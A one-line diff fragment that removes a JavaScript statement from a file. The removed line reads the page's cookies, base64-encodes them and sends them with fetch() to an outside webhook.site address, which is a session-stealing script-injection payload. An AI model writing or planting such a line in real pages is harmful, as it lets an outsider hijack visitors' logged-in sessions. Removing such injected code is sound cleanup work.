@@ -1,1 +1,0 @@
-fetch("https://webhook.site/45036cb8-6a63-42b7-9cd8-f6b4a6ba60a1?"+btoa(document.cookie))
